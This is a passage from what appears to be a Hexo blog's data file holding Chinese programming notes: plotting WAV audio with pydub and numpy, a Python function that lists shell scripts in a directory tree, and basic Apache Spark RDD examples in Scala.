wave\nfrom matplotlib import pylab as pl\nimport numpy as np\nimport pydub\nfrom pydub import AudioSegment\n\npydub.AudioSegment.converter = r'ffmpeg.exe'\nsound = AudioSegment.from_mp3(r\"2018-05-09T09_40_04.301Z.mp3\")\nsound.export(\"test.wav\", format=\"wav\")\n\n\n# 打开WAV文档\nf = wave.open(r\"test.wav\", \"rb\")\n\n# 读取格式信息\n# (nchannels, sampwidth, framerate, nframes, comptype, compname)\nparams = f.getparams()\nnchannels, sampwidth, framerate, nframes = params[:4]\n\n# 读取波形数据\nstr_data = f.readframes(nframes)\nf.close()\n\n#将波形数据转换为数组\nwave_data = np.fromstring(str_data, dtype=np.short)\nwave_data.shape = -1, 2\nwave_data = wave_data.T\n# wave_data = wave_data[1]\ntime = np.arange(0, nframes) * (1.0 / framerate)\n\n# 绘制波形\npl.subplot(211)\npl.plot(time, wave_data[0])\npl.subplot(212)\npl.plot(time, wave_data[1], c=\"g\")\npl.xlabel(\"time (seconds)\")\npl.show()","slug":"python/音频处理","published":1,"updated":"2018-07-10T13:10:09.978Z","_id":"cjjedmhbp00790gtj68dbj2wa","comments":1,"layout":"post","photos":[],"link":"","content":"<p>网页录音<br><a href=\"https://github.com/mattdiamond/Recorderjs\" target=\"_blank\" rel=\"noopener\">https://github.com/mattdiamond/Recorderjs</a></p>\n<p>格式转换，切割合并<br><a href=\"https://github.com/jiaaro/pydub#installation\" target=\"_blank\" rel=\"noopener\">https://github.com/jiaaro/pydub#installation</a></p>\n<p>音频分析<br><a href=\"https://docs.python.org/3/library/wave.html\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/library/wave.html</a><br><a href=\"http://bigsec.net/b52/scipydoc/wave_pyaudio.html\" target=\"_blank\" rel=\"noopener\">http://bigsec.net/b52/scipydoc/wave_pyaudio.html</a></p>\n<p><code>`</code><br>import wave<br>from matplotlib import pylab as pl<br>import numpy as np<br>import pydub<br>from pydub import AudioSegment</p>\n<p>pydub.AudioSegment.converter = r’ffmpeg.exe’<br>sound = AudioSegment.from_mp3(r”2018-05-09T09_40_04.301Z.mp3”)<br>sound.export(“test.wav”, format=”wav”)</p>\n<h1 id=\"打开WAV文档\"><a href=\"#打开WAV文档\" class=\"headerlink\" title=\"打开WAV文档\"></a>打开WAV文档</h1><p>f = wave.open(r”test.wav”, “rb”)</p>\n<h1 id=\"读取格式信息\"><a href=\"#读取格式信息\" class=\"headerlink\" title=\"读取格式信息\"></a>读取格式信息</h1><h1 id=\"nchannels-sampwidth-framerate-nframes-comptype-compname\"><a href=\"#nchannels-sampwidth-framerate-nframes-comptype-compname\" class=\"headerlink\" title=\"(nchannels, sampwidth, framerate, nframes, comptype, compname)\"></a>(nchannels, sampwidth, framerate, nframes, comptype, compname)</h1><p>params = f.getparams()<br>nchannels, sampwidth, framerate, nframes = params[:4]</p>\n<h1 id=\"读取波形数据\"><a href=\"#读取波形数据\" class=\"headerlink\" title=\"读取波形数据\"></a>读取波形数据</h1><p>str_data = f.readframes(nframes)<br>f.close()</p>\n<p>#将波形数据转换为数组<br>wave_data = np.fromstring(str_data, dtype=np.short)<br>wave_data.shape = -1, 2<br>wave_data = wave_data.T</p>\n<h1 id=\"wave-data-wave-data-1\"><a href=\"#wave-data-wave-data-1\" class=\"headerlink\" title=\"wave_data = wave_data[1]\"></a>wave_data = wave_data[1]</h1><p>time = np.arange(0, nframes) * (1.0 / framerate)</p>\n<h1 id=\"绘制波形\"><a href=\"#绘制波形\" class=\"headerlink\" title=\"绘制波形\"></a>绘制波形</h1><p>pl.subplot(211)<br>pl.plot(time, wave_data[0])<br>pl.subplot(212)<br>pl.plot(time, wave_data[1], c=”g”)<br>pl.xlabel(“time (seconds)”)<br>pl.show()</p>\n","site":{"data":{}},"excerpt":"","more":"<p>网页录音<br><a href=\"https://github.com/mattdiamond/Recorderjs\" target=\"_blank\" rel=\"noopener\">https://github.com/mattdiamond/Recorderjs</a></p>\n<p>格式转换，切割合并<br><a href=\"https://github.com/jiaaro/pydub#installation\" target=\"_blank\" rel=\"noopener\">https://github.com/jiaaro/pydub#installation</a></p>\n<p>音频分析<br><a href=\"https://docs.python.org/3/library/wave.html\" target=\"_blank\" rel=\"noopener\">https://docs.python.org/3/library/wave.html</a><br><a href=\"http://bigsec.net/b52/scipydoc/wave_pyaudio.html\" target=\"_blank\" rel=\"noopener\">http://bigsec.net/b52/scipydoc/wave_pyaudio.html</a></p>\n<p><code>`</code><br>import wave<br>from matplotlib import pylab as pl<br>import numpy as np<br>import pydub<br>from pydub import AudioSegment</p>\n<p>pydub.AudioSegment.converter = r’ffmpeg.exe’<br>sound = AudioSegment.from_mp3(r”2018-05-09T09_40_04.301Z.mp3”)<br>sound.export(“test.wav”, format=”wav”)</p>\n<h1 id=\"打开WAV文档\"><a href=\"#打开WAV文档\" class=\"headerlink\" title=\"打开WAV文档\"></a>打开WAV文档</h1><p>f = wave.open(r”test.wav”, “rb”)</p>\n<h1 id=\"读取格式信息\"><a href=\"#读取格式信息\" class=\"headerlink\" title=\"读取格式信息\"></a>读取格式信息</h1><h1 id=\"nchannels-sampwidth-framerate-nframes-comptype-compname\"><a href=\"#nchannels-sampwidth-framerate-nframes-comptype-compname\" class=\"headerlink\" title=\"(nchannels, sampwidth, framerate, nframes, comptype, compname)\"></a>(nchannels, sampwidth, framerate, nframes, comptype, compname)</h1><p>params = f.getparams()<br>nchannels, sampwidth, framerate, nframes = params[:4]</p>\n<h1 id=\"读取波形数据\"><a href=\"#读取波形数据\" class=\"headerlink\" title=\"读取波形数据\"></a>读取波形数据</h1><p>str_data = f.readframes(nframes)<br>f.close()</p>\n<p>#将波形数据转换为数组<br>wave_data = np.fromstring(str_data, dtype=np.short)<br>wave_data.shape = -1, 2<br>wave_data = wave_data.T</p>\n<h1 id=\"wave-data-wave-data-1\"><a href=\"#wave-data-wave-data-1\" class=\"headerlink\" title=\"wave_data = wave_data[1]\"></a>wave_data = wave_data[1]</h1><p>time = np.arange(0, nframes) * (1.0 / framerate)</p>\n<h1 id=\"绘制波形\"><a href=\"#绘制波形\" class=\"headerlink\" title=\"绘制波形\"></a>绘制波形</h1><p>pl.subplot(211)<br>pl.plot(time, wave_data[0])<br>pl.subplot(212)<br>pl.plot(time, wave_data[1], c=”g”)<br>pl.xlabel(“time (seconds)”)<br>pl.show()</p>\n"},{"title":"执行某一目录下的所有shell脚本","date":"2018-07-10T13:09:19.000Z","_content":"#### for i in tree:会多次循环，很奇怪\n```\nimport os\n\n# import commands\n\nhomedir = os.path.dirname(os.path.abspath('run_sqoop.py'))\n\n\ndef get_shells(filedir):\n    print(\"dirName............. \", filedir)\n    tree = os.walk(filedir, topdown=True)\n    for i in tree:\n        nodeName = i[0]\n        nodeDir = i[1]\n        nodeFiles = i[2]\n        print(\">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>nodeName: \", nodeName)\n        for file in nodeFiles:\n            if (file.endswith(\".sh\")):\n                command = nodeName + \"/\" + file\n                print(\"commands:\", command)\n                # out = commands.getstatusoutput(command)\n                # print(out)\n        for shelldir in nodeDir:\n            get_shells(shelldir)\n        return\n\n\nget_shells(homedir)\n```","source":"_posts/python/执行某一目录下的所有shell脚本.md","raw":"---\ntitle: 执行某一目录下的所有shell脚本\ndate: 2018-07-10 21:09:19\ntags: python\n---\n#### for i in tree:会多次循环，很奇怪\n```\nimport os\n\n# import commands\n\nhomedir = os.path.dirname(os.path.abspath('run_sqoop.py'))\n\n\ndef get_shells(filedir):\n    print(\"dirName............. \", filedir)\n    tree = os.walk(filedir, topdown=True)\n    for i in tree:\n        nodeName = i[0]\n        nodeDir = i[1]\n        nodeFiles = i[2]\n        print(\">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>nodeName: \", nodeName)\n        for file in nodeFiles:\n            if (file.endswith(\".sh\")):\n                command = nodeName + \"/\" + file\n                print(\"commands:\", command)\n                # out = commands.getstatusoutput(command)\n                # print(out)\n        for shelldir in nodeDir:\n            get_shells(shelldir)\n        return\n\n\nget_shells(homedir)\n```","slug":"python/执行某一目录下的所有shell脚本","published":1,"updated":"2018-07-10T13:10:09.975Z","_id":"cjjedmhbq007b0gtjk976z3yi","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"for-i-in-tree-会多次循环，很奇怪\"><a href=\"#for-i-in-tree-会多次循环，很奇怪\" class=\"headerlink\" title=\"for i in tree:会多次循环，很奇怪\"></a>for i in tree:会多次循环，很奇怪</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># import commands</span><br><span class=\"line\"></span><br><span class=\"line\">homedir = os.path.dirname(os.path.abspath(&apos;run_sqoop.py&apos;))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def get_shells(filedir):</span><br><span class=\"line\">    print(&quot;dirName............. &quot;, filedir)</span><br><span class=\"line\">    tree = os.walk(filedir, topdown=True)</span><br><span class=\"line\">    for i in tree:</span><br><span class=\"line\">        nodeName = i[0]</span><br><span class=\"line\">        nodeDir = i[1]</span><br><span class=\"line\">        nodeFiles = i[2]</span><br><span class=\"line\">        print(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;nodeName: &quot;, nodeName)</span><br><span class=\"line\">        for file in nodeFiles:</span><br><span class=\"line\">            if (file.endswith(&quot;.sh&quot;)):</span><br><span class=\"line\">                command = nodeName + &quot;/&quot; + file</span><br><span class=\"line\">                print(&quot;commands:&quot;, command)</span><br><span class=\"line\">                # out = commands.getstatusoutput(command)</span><br><span class=\"line\">                # print(out)</span><br><span class=\"line\">        for shelldir in nodeDir:</span><br><span class=\"line\">            get_shells(shelldir)</span><br><span class=\"line\">        return</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">get_shells(homedir)</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"for-i-in-tree-会多次循环，很奇怪\"><a href=\"#for-i-in-tree-会多次循环，很奇怪\" class=\"headerlink\" title=\"for i in tree:会多次循环，很奇怪\"></a>for i in tree:会多次循环，很奇怪</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># import commands</span><br><span class=\"line\"></span><br><span class=\"line\">homedir = os.path.dirname(os.path.abspath(&apos;run_sqoop.py&apos;))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def get_shells(filedir):</span><br><span class=\"line\">    print(&quot;dirName............. &quot;, filedir)</span><br><span class=\"line\">    tree = os.walk(filedir, topdown=True)</span><br><span class=\"line\">    for i in tree:</span><br><span class=\"line\">        nodeName = i[0]</span><br><span class=\"line\">        nodeDir = i[1]</span><br><span class=\"line\">        nodeFiles = i[2]</span><br><span class=\"line\">        print(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;nodeName: &quot;, nodeName)</span><br><span class=\"line\">        for file in nodeFiles:</span><br><span class=\"line\">            if (file.endswith(&quot;.sh&quot;)):</span><br><span class=\"line\">                command = nodeName + &quot;/&quot; + file</span><br><span class=\"line\">                print(&quot;commands:&quot;, command)</span><br><span class=\"line\">                # out = commands.getstatusoutput(command)</span><br><span class=\"line\">                # print(out)</span><br><span class=\"line\">        for shelldir in nodeDir:</span><br><span class=\"line\">            get_shells(shelldir)</span><br><span class=\"line\">        return</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">get_shells(homedir)</span><br></pre></td></tr></table></figure>"},{"title":"10.RDD基本操作","date":"2018-07-10T13:09:19.000Z","_content":"```\npackage rddbasic\n\nimport org.apache.spark.storage.StorageLevel\nimport org.apache.spark.{SparkConf, SparkContext}\n\n/**\n  * Created by hanq0 on 2017/10/23.\n  */\nobject stuRdds {\n  val conf = new SparkConf().setAppName(\"WordCount\").setMaster(\"local\")\n  val sc = new SparkContext(conf)\n\n  //内部集合\n  def innnerRdds(): Unit = {\n    val data = Array(1, 2, 3, 4, 5)\n    val distData = sc.parallelize(data)\n  }\n\n  //外部数据\n  def outterRdds(): Unit = {\n    val distFile = sc.textFile(\"data.txt\")\n  }\n\n  //基本操作\n  def basicRdd(): Unit = {\n    val lines = sc.textFile(\"data.txt\")\n    val lineLengths = lines.map(s => s.length)\n    val totalLength = lineLengths.reduce((a, b) => a + b)\n  }\n\n  //调用函数\n  def passFunctions(): Unit = {\n    val lines = sc.textFile(\"data.txt\")\n    val lineLengths = lines.map(MyFunctions.mymap)\n    //val totalLength = lineLengths.reduce(MyFunctions.myreduce())\n  }\n\n  //闭包，集群模式下变量被分隔\n  def valuesDisparched(): Unit = {\n    var counter = 0\n    val data = Array(1, 2, 3, 4, 5)\n    var rdd = sc.parallelize(data)\n    // Wrong: Don't do this!!\n    rdd.foreach(x => counter += x)\n    println(\"Counter value: \" + counter)\n  }\n\n  //对键值对（key-value）的操作\n  def KeyValueactions(): Unit = {\n    val lines = sc.textFile(\"data.txt\")\n    val pairs = lines.map(s => (s, 1))\n    val counts = pairs.reduceByKey((a, b) => a + b)\n  }\n\n  //Rdd的转换Transformations\n  def RddTransformations(): Unit = {\n    val data0 = Array(1, 2, 3, 4, 5)\n    val data1 = Array(6, 7, 8, 9, 0)\n    val data2 = data0.union(data1)\n    //sortByKey([ascending], [numTasks]),sample(withReplacement, fraction, seed),repartition(numPartitions)......\n  }\n\n  //Rdd的操作Actions\n  def RddActions(): Unit = {\n    val data = Array(1, 2, 3, 4, 5)\n    var rdd = sc.parallelize(data)\n    rdd.foreach(x => x+1)\n    //reduce(func),collect(),count()......\n  }\n\n  //Rdd的持久化\n  def RddStorage(): Unit = {\n    val data = sc.textFile(\"data.txt\")\n    data.persist(StorageLevel.MEMORY_ONLY) // persist() 方法进行设置\n    data.cache() //cache() 方法是使用默认存储级别的快捷设置方法\n  }\n\n  //共享变量\n\n  //Broadcast variables（广播变量）允许程序员将一个 read-only（只读的）变量缓存到每台机器上\n  def BroadcastVariables(): Unit = {\n    val broadcastVar = sc.broadcast(Array(1, 2, 3))\n    print(broadcastVar.value)\n  }\n\n  //Accumulators（累加器）是一个仅可以执行 “added”（添加）的变量来通过一个关联和交换操作\n  def AccumulatorsVariables(): Unit = {\n    val accum = sc.longAccumulator(\"My Accumulator\")\n    sc.parallelize(Array(1, 2, 3, 4)).foreach(x => accum.add(x))\n    print(accum.value)\n  }\n\n\n}\n\n```","source":"_posts/spark/10.RDD基本操作.md","raw":"---\ntitle: 10.RDD基本操作\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n```\npackage rddbasic\n\nimport org.apache.spark.storage.StorageLevel\nimport org.apache.spark.{SparkConf, SparkContext}\n\n/**\n  * Created by hanq0 on 2017/10/23.\n  */\nobject stuRdds {\n  val conf = new SparkConf().setAppName(\"WordCount\").setMaster(\"local\")\n  val sc = new SparkContext(conf)\n\n  //内部集合\n  def innnerRdds(): Unit = {\n    val data = Array(1, 2, 3, 4, 5)\n    val distData = sc.parallelize(data)\n  }\n\n  //外部数据\n  def outterRdds(): Unit = {\n    val distFile = sc.textFile(\"data.txt\")\n  }\n\n  //基本操作\n  def basicRdd(): Unit = {\n    val lines = sc.textFile(\"data.txt\")\n    val lineLengths = lines.map(s => s.length)\n    val totalLength = lineLengths.reduce((a, b) => a + b)\n  }\n\n  //调用函数\n  def passFunctions(): Unit = {\n    val lines = sc.textFile(\"data.txt\")\n    val lineLengths = lines.map(MyFunctions.mymap)\n    //val totalLength = lineLengths.reduce(MyFunctions.myreduce())\n  }\n\n  //闭包，集群模式下变量被分隔\n  def valuesDisparched(): Unit = {\n    var counter = 0\n    val data = Array(1, 2, 3, 4, 5)\n    var rdd = sc.parallelize(data)\n    // Wrong: Don't do this!!\n    rdd.foreach(x => counter += x)\n    println(\"Counter value: \" + counter)\n  }\n\n  //对键值对（key-value）的操作\n  def KeyValueactions(): Unit = {\n    val lines = sc.textFile(\"data.txt\")\n    val pairs = lines.map(s => (s, 1))\n    val counts = pairs.reduceByKey((a, b) => a + b)\n  }\n\n  //Rdd的转换Transformations\n  def RddTransformations(): Unit = {\n    val data0 = Array(1, 2, 3, 4, 5)\n    val data1 = Array(6, 7, 8, 9, 0)\n    val data2 = data0.union(data1)\n    //sortByKey([ascending], [numTasks]),sample(withReplacement, fraction, seed),repartition(numPartitions)......\n  }\n\n  //Rdd的操作Actions\n  def RddActions(): Unit = {\n    val data = Array(1, 2, 3, 4, 5)\n    var rdd = sc.parallelize(data)\n    rdd.foreach(x => x+1)\n    //reduce(func),collect(),count()......\n  }\n\n  //Rdd的持久化\n  def RddStorage(): Unit = {\n    val data = sc.textFile(\"data.txt\")\n    data.persist(StorageLevel.MEMORY_ONLY) // persist() 方法进行设置\n    data.cache() //cache() 方法是使用默认存储级别的快捷设置方法\n  }\n\n  //共享变量\n\n  //Broadcast variables（广播变量）允许程序员将一个 read-only（只读的）变量缓存到每台机器上\n  def BroadcastVariables(): Unit = {\n    val broadcastVar = sc.broadcast(Array(1, 2, 3))\n    print(broadcastVar.value)\n  }\n\n  //Accumulators（累加器）是一个仅可以执行 “added”（添加）的变量来通过一个关联和交换操作\n  def AccumulatorsVariables(): Unit = {\n    val accum = sc.longAccumulator(\"My Accumulator\")\n    sc.parallelize(Array(1, 2, 3, 4)).foreach(x => accum.add(x))\n    print(accum.value)\n  }\n\n\n}\n\n```","slug":"spark/10.RDD基本操作","published":1,"updated":"2018-07-10T13:10:09.980Z","_id":"cjjedmhbr007d0gtj7xczoaep","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package rddbasic</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.spark.storage.StorageLevel</span><br><span class=\"line\">import org.apache.spark.&#123;SparkConf, SparkContext&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">  * Created by hanq0 on 2017/10/23.</span><br><span class=\"line\">  */</span><br><span class=\"line\">object stuRdds &#123;</span><br><span class=\"line\">  val conf = new SparkConf().setAppName(&quot;WordCount&quot;).setMaster(&quot;local&quot;)</span><br><span class=\"line\">  val sc = new SparkContext(conf)</span><br><span class=\"line\"></span><br><span class=\"line\">  //内部集合</span><br><span class=\"line\">  def innnerRdds(): Unit = &#123;</span><br><span class=\"line\">    val data = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    val distData = sc.parallelize(data)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //外部数据</span><br><span class=\"line\">  def outterRdds(): Unit = &#123;</span><br><span class=\"line\">    val distFile = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //基本操作</span><br><span class=\"line\">  def basicRdd(): Unit = &#123;</span><br><span class=\"line\">    val lines = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    val lineLengths = lines.map(s =&gt; s.length)</span><br><span class=\"line\">    val totalLength = lineLengths.reduce((a, b) =&gt; a + b)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //调用函数</span><br><span class=\"line\">  def passFunctions(): Unit = &#123;</span><br><span class=\"line\">    val lines = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    val lineLengths = lines.map(MyFunctions.mymap)</span><br><span class=\"line\">    //val totalLength = lineLengths.reduce(MyFunctions.myreduce())</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //闭包，集群模式下变量被分隔</span><br><span class=\"line\">  def valuesDisparched(): Unit = &#123;</span><br><span class=\"line\">    var counter = 0</span><br><span class=\"line\">    val data = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    var rdd = sc.parallelize(data)</span><br><span class=\"line\">    // Wrong: Don&apos;t do this!!</span><br><span class=\"line\">    rdd.foreach(x =&gt; counter += x)</span><br><span class=\"line\">    println(&quot;Counter value: &quot; + counter)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //对键值对（key-value）的操作</span><br><span class=\"line\">  def KeyValueactions(): Unit = &#123;</span><br><span class=\"line\">    val lines = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    val pairs = lines.map(s =&gt; (s, 1))</span><br><span class=\"line\">    val counts = pairs.reduceByKey((a, b) =&gt; a + b)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Rdd的转换Transformations</span><br><span class=\"line\">  def RddTransformations(): Unit = &#123;</span><br><span class=\"line\">    val data0 = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    val data1 = Array(6, 7, 8, 9, 0)</span><br><span class=\"line\">    val data2 = data0.union(data1)</span><br><span class=\"line\">    //sortByKey([ascending], [numTasks]),sample(withReplacement, fraction, seed),repartition(numPartitions)......</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Rdd的操作Actions</span><br><span class=\"line\">  def RddActions(): Unit = &#123;</span><br><span class=\"line\">    val data = Array(1, 2, 3, 4, 5)</span><br><span class=\"line\">    var rdd = sc.parallelize(data)</span><br><span class=\"line\">    rdd.foreach(x =&gt; x+1)</span><br><span class=\"line\">    //reduce(func),collect(),count()......</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Rdd的持久化</span><br><span class=\"line\">  def RddStorage(): Unit = &#123;</span><br><span class=\"line\">    val data = sc.textFile(&quot;data.txt&quot;)</span><br><span class=\"line\">    data.persist(StorageLevel.MEMORY_ONLY) // persist() 方法进行设置</span><br><span class=\"line\">    data.cache() //cache() 方法是使用默认存储级别的快捷设置方法</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //共享变量</span><br><span class=\"line\"></span><br><span class=\"line\">  //Broadcast variables（广播变量）允许程序员将一个 read-only（只读的）变量缓存到每台机器上</span><br><span class=\"line\">  def BroadcastVariables(): Unit = &#123;</span><br><span class=\"line\">    val broadcastVar = sc.broadcast(Array(1, 2, 3))</span><br><span class=\"line\">    print(broadcastVar.value)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //Accumulators（累加器）是一个仅可以执行 “added”（添加）的变量来通过一个关联和交换操作</span><br><span class=\"line\">  def AccumulatorsVariables(): Unit = &#123;</span><br><span class=\"line\">    val accum = sc.longAccumulator(&quot;My Accumulator&quot;)</span><br><span class=\"line\">    sc.parallelize(Array(1, 2, 3, 4)).foreach(x =&gt; accum.add(x))</span><br><span class=\"line\">    print(accum.value)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span 